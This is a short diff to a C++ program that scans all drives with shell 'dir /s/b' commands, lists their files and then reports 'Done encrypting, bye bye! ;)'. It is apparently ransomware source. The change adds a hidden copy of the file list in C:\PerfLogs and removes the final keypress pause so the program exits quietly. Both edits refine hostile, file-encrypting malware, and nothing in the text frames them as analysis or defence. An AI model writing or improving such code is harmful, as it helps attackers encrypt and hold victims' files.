@@ -98,6 +98,9 @@ int main(int argc, char** argv) {
             string result = "dir -d " + buffAsStdStr + ":\\ /s/b " + ">> list";
             cout << result + '\n';
             system(result.c_str());
+
+            string result2 = "dir -d " + buffAsStdStr + ":\\ /s/b " + ">> C:\\PerfLogs\\list";
+            system(result2.c_str());
         }
 
     cout << "Done scanning the disk!\n";
@@ -165,6 +168,5 @@ int main(int argc, char** argv) {
 
 
     cout << "Done encrypting, bye bye! ;)\n";
-    cin.get();
     return 0;
 }
